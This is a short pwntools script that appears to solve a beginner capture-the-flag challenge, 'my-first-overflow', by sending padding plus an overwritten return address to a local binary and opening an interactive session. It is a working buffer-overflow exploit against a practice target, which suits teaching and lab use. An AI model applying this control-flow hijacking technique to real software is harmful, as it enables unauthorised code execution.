#! /usr/bin/python3
from pwn import *


p = process('./challenge/my-first-overflow')

p.sendlineafter(b'Enter your input: ', b'aaaabaaacaaadaaaeaaafaaagaaahaaa\x99\x11\x00\x00\x00\x00\x00\x00')
p.interactive()